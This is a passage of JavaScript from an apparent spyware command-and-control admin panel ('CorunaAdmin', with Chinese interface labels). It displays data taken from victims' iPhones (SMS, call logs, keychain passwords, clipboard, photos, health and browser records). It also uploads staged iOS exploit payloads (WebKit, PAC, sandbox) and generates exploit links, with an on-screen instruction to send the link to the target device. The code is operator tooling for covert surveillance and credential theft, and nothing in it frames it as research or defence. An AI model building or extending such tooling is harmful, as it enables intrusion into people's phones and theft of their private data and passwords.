        </table>`;
    }

    renderSMS(data) {
        return `<table class="data-table">
            <thead><tr><th>发件人</th><th>收件人</th><th>内容</th><th>日期</th><th>类型</th></tr></thead>
            <tbody>${data.map(s => `<tr><td>${s.sender || '-'}</td><td>${s.recipient || '-'}</td><td>${this.truncate(s.message || '', 50)}</td><td>${this.formatDateTime(s.date_sent)}</td><td>${s.message_type || '-'}</td></tr>`).join('')}</tbody>
        </table>`;
    }

    renderCalls(data) {
        return `<table class="data-table">
            <thead><tr><th>号码</th><th>姓名</th><th>类型</th><th>日期</th><th>时长(秒)</th></tr></thead>
            <tbody>${data.map(c => `<tr><td>${c.phone_number || '-'}</td><td>${c.contact_name || '-'}</td><td>${c.call_type || '-'}</td><td>${this.formatDateTime(c.date_called)}</td><td>${c.duration || '-'}</td></tr>`).join('')}</tbody>
        </table>`;
    }

    renderKeychain(data) {
        return `<table class="data-table">
            <thead><tr><th>账户</th><th>服务</th><th>密码</th><th>创建时间</th></tr></thead>
            <tbody>${data.map(k => `<tr><td>${k.account || '-'}</td><td>${k.service || '-'}</td><td>${k.password || '-'}</td><td>${this.formatDateTime(k.created_at)}</td></tr>`).join('')}</tbody>
        </table>`;
    }

    renderPhotos(data) {
        return `<table class="data-table">
            <thead><tr><th>文件名</th><th>路径</th><th>日期</th><th>尺寸</th></tr></thead>
            <tbody>${data.map(p => `<tr><td>${p.filename || '-'}</td><td>${this.truncate(p.file_path || '', 30)}</td><td>${this.formatDateTime(p.date_taken)}</td><td>${p.width || '-'}x${p.height || '-'}</td></tr>`).join('')}</tbody>
        </table>`;
    }

    renderClipboard(data) {
        return `<table class="data-table">
            <thead><tr><th>内容</th><th>时间戳</th></tr></thead>
            <tbody>${data.map(c => `<tr><td>${this.truncate(c.content || '', 100)}</td><td>${this.formatDateTime(c.timestamp)}</td></tr>`).join('')}</tbody>
        </table>`;
    }

    renderApps(data) {
        return `<table class="data-table">
            <thead><tr><th>应用名</th><th>Bundle ID</th><th>版本</th><th>安装日期</th></tr></thead>
            <tbody>${data.map(a => `<tr><td>${a.app_name || '-'}</td><td>${a.bundle_id || '-'}</td><td>${a.version || '-'}</td><td>${this.formatDateTime(a.install_date)}</td></tr>`).join('')}</tbody>
        </table>`;
    }

    renderProcesses(data) {
        return `<table class="data-table">
            <thead><tr><th>进程名</th><th>PID</th><th>用户</th><th>CPU</th><th>内存</th><th>创建时间</th></tr></thead>
            <tbody>${data.map(p => `<tr><td>${p.process_name || '-'}</td><td>${p.pid || '-'}</td><td>${p.user || '-'}</td><td>${p.cpu_usage || '-'}</td><td>${p.memory_usage || '-'}</td><td>${this.formatDateTime(p.created_at)}</td></tr>`).join('')}</tbody>
        </table>`;
    }

    renderWiFi(data) {
        return `<table class="data-table">
            <thead><tr><th>SSID</th><th>BSSID</th><th>加密</th><th>已保存</th><th>信号强度</th></tr></thead>
            <tbody>${data.map(w => `<tr><td>${w.ssid || '-'}</td><td>${w.bssid || '-'}</td><td>${w.security || '-'}</td><td>${w.is_saved ? '是' : '否'}</td><td>${w.signal_strength || '-'}</td></tr>`).join('')}</tbody>
        </table>`;
    }

    renderBrowserHistory(data) {
        return `<table class="data-table">
            <thead><tr><th>标题</th><th>URL</th><th>访问时间</th></tr></thead>
            <tbody>${data.map(h => `<tr><td>${this.truncate(h.title || '', 30)}</td><td>${this.truncate(h.url || '', 50)}</td><td>${this.formatDateTime(h.last_visited)}</td></tr>`).join('')}</tbody>
        </table>`;
    }

    renderCalendar(data) {
        return `<table class="data-table">
            <thead><tr><th>标题</th><th>开始时间</th><th>结束时间</th><th>地点</th></tr></thead>
            <tbody>${data.map(e => `<tr><td>${e.title || '-'}</td><td>${this.formatDateTime(e.start_date)}</td><td>${this.formatDateTime(e.end_date)}</td><td>${e.location || '-'}</td></tr>`).join('')}</tbody>
        </table>`;
    }

    renderNotes(data) {
        return `<table class="data-table">
            <thead><tr><th>标题</th><th>内容</th><th>修改时间</th></tr></thead>
            <tbody>${data.map(n => `<tr><td>${n.title || '-'}</td><td>${this.truncate(n.content || '', 50)}</td><td>${this.formatDateTime(n.modified_date)}</td></tr>`).join('')}</tbody>
        </table>`;
    }

    renderHealth(data) {
        return `<table class="data-table">
            <thead><tr><th>类型</th><th>值</th><th>单位</th><th>开始时间</th><th>结束时间</th></tr></thead>
            <tbody>${data.map(h => `<tr><td>${h.data_type || '-'}</td><td>${h.value || '-'}</td><td>${h.unit || '-'}</td><td>${this.formatDateTime(h.start_date)}</td><td>${this.formatDateTime(h.end_date)}</td></tr>`).join('')}</tbody>
        </table>`;
    }

    renderGenericTable(data) {
        if (!data || !data.length) return '';
        const keys = Object.keys(data[0]);
        return `<table class="data-table">
            <thead><tr>${keys.map(k => `<th>${k}</th>`).join('')}</tr></thead>
            <tbody>${data.map(item => `<tr>${keys.map(k => `<td>${this.truncate(item[k]?.toString() || '-', 50)}</td>`).join('')}</tr>`).join('')}</tbody>
        </table>`;
    }

    async loadPayloadFilters() {
        try {
            const versionsResult = await this.apiCall('/payloads/versions');
            const stagesResult = await this.apiCall('/payloads/stages');
            
            const versionFilter = document.getElementById('payloadVersionFilter');
            versionFilter.innerHTML = '<option value="">全部版本</option>';
            if (versionsResult.versions) {
                Object.keys(versionsResult.versions).forEach(v => {
                    versionFilter.innerHTML += `<option value="${v}">${v}</option>`;
                });
            }
            
            const stageFilter = document.getElementById('payloadStageFilter');
            stageFilter.innerHTML = '<option value="">全部阶段</option>';
            if (stagesResult.stages) {
                Object.keys(stagesResult.stages).forEach(s => {
                    stageFilter.innerHTML += `<option value="${s}">${s}</option>`;
                });
            }
        } catch (error) {
            console.error('Load payload filters error:', error);
        }
    }

    renderPayloads(payloads) {
        const tbody = document.getElementById('payloadsTable');
        tbody.innerHTML = '';
        
        payloads.forEach(payload => {
            const row = this.createPayloadRow(payload);
            tbody.appendChild(row);
        });
        
        if (payloads.length === 0) {
            tbody.innerHTML = '<tr><td colspan="7" style="text-align: center; color: #9ca3af;">暂无Payload</td></tr>';
        }
    }

    createPayloadRow(payload) {
        const row = document.createElement('tr');
        const payloadId = `${payload.exploit_stage}/${payload.ios_version}/${payload.filename}`;
        
        row.innerHTML = `
            <td>${payload.name || '-'}</td>
            <td>${payload.filename || '-'}</td>
            <td>${payload.ios_version || '-'}</td>
            <td>${payload.exploit_stage || '-'}</td>
            <td>${this.formatBytes(payload.file_size || 0)}</td>
            <td>${payload.upload_time ? this.formatDateTime(payload.upload_time) : '-'}</td>
            <td>
                <button class="action-btn view" onclick="admin.downloadPayload('${payloadId}')">下载</button>
                <button class="action-btn delete" onclick="admin.deletePayload('${payloadId}')">删除</button>
            </td>
        `;
        
        return row;
    }

    showUploadPayloadModal() {
        const modalBody = document.getElementById('modalBody');
        modalBody.innerHTML = `
            <form id="uploadPayloadForm" enctype="multipart/form-data">
                <div class="form-group">
                    <label>名称</label>
                    <input type="text" id="payloadName" required placeholder="Payload名称">
                </div>
                <div class="form-group">
                    <label>iOS版本</label>
                    <input type="text" id="payloadVersion" required placeholder="如: 16.0">
                </div>
                <div class="form-group">
                    <label>Exploit阶段</label>
                    <select id="payloadStage" required>
                        <option value="stage1">Stage 1 (WebKit)</option>
                        <option value="stage2">Stage 2 (PAC)</option>
                        <option value="stage3">Stage 3 (Sandbox)</option>
                    </select>
                </div>
                <div class="form-group">
                    <label>描述</label>
                    <textarea id="payloadDescription" placeholder="描述信息"></textarea>
                </div>
                <div class="form-group">
                    <label>文件</label>
                    <input type="file" id="payloadFile" required accept=".js,.bin,.dylib,.plist">
                </div>
                <button type="submit" class="btn btn-primary btn-block">上传</button>
            </form>
        `;
        
        document.getElementById('modalTitle').textContent = '上传Payload';
        document.getElementById('modal').classList.add('active');
        
        document.getElementById('uploadPayloadForm').addEventListener('submit', (e) => {
            e.preventDefault();
            this.uploadPayload();
        });
    }

    async uploadPayload() {
        const name = document.getElementById('payloadName').value;
        const version = document.getElementById('payloadVersion').value;
        const stage = document.getElementById('payloadStage').value;
        const description = document.getElementById('payloadDescription').value;
        const file = document.getElementById('payloadFile').files[0];
        
        if (!file) {
            this.showToast('请选择文件', 'error');
            return;
        }
        
        try {
            const formData = new FormData();
            formData.append('name', name);
            formData.append('ios_version', version);
            formData.append('exploit_stage', stage);
            formData.append('description', description);
            formData.append('file', file);
            
            const response = await fetch(`/api/payloads/upload`, {
                method: 'POST',
                headers: {
                    'Authorization': `Bearer ${this.token}`
                },
                body: formData
            });
            
            if (response.ok) {
                const data = await response.json();
                this.showToast('Payload上传成功', 'success');
                this.closeModal();
                this.loadPayloads();
            } else {
                const error = await response.json();
                this.showToast(error.detail || '上传失败', 'error');
            }
        } catch (error) {
            console.error('Upload payload error:', error);
            this.showToast('上传失败', 'error');
        }
    }

    showGenerateLinkModal() {
        const modalBody = document.getElementById('modalBody');
        modalBody.innerHTML = `
            <form id="generateLinkForm">
                <div class="form-group">
                    <label>iOS版本</label>
                    <input type="text" id="linkVersion" required placeholder="如: 16.0">
                </div>
                <div class="form-group">
                    <label>Exploit Chain (可选)</label>
                    <input type="text" id="linkChain" placeholder="留空使用默认">
                </div>
                <button type="submit" class="btn btn-primary btn-block">生成链接</button>
            </form>
            <div id="generatedLink" style="display: none; margin-top: 20px; padding: 15px; background: #f3f4f6; border-radius: 8px;">
                <h4>生成的链接:</h4>
                <input type="text" id="linkOutput" readonly style="width: 100%; padding: 8px; margin-top: 10px;" onclick="this.select()">
                <p style="font-size: 12px; color: #6b7280; margin-top: 10px;">将此链接发送给目标设备打开</p>
            </div>
        `;
        
        document.getElementById('modalTitle').textContent = '生成Exploit链接';
        document.getElementById('modal').classList.add('active');
        
        document.getElementById('generateLinkForm').addEventListener('submit', (e) => {
            e.preventDefault();
            this.generateLink();
        });
    }

    async generateLink() {
        const version = document.getElementById('linkVersion').value;
        const chain = document.getElementById('linkChain').value;
        
        try {
            let endpoint = '/payloads/generate-link?ios_version=' + encodeURIComponent(version);
            if (chain) {
                endpoint += '&exploit_chain=' + encodeURIComponent(chain);
            }
            
            const result = await this.apiCall(endpoint);
            
            document.getElementById('linkOutput').value = result.exploit_url;
            document.getElementById('generatedLink').style.display = 'block';
            this.showToast('链接生成成功', 'success');
        } catch (error) {
            console.error('Generate link error:', error);
            this.showToast('生成链接失败', 'error');
        }
    }

    downloadPayload(payloadId) {
        window.open(`/api/payloads/download/${payloadId}`, '_blank');
    }

    async deletePayload(payloadId) {
        if (!confirm('确定要删除此Payload吗？')) {
            return;
        }
        
        try {
            await this.apiCall(`/payloads/${payloadId}`, {
                method: 'DELETE'
            });
            this.showToast('Payload删除成功', 'success');
            this.loadPayloads();
        } catch (error) {
            console.error('Delete payload error:', error);
            this.showToast('删除失败', 'error');
        }
    }
}

const admin = new CorunaAdmin();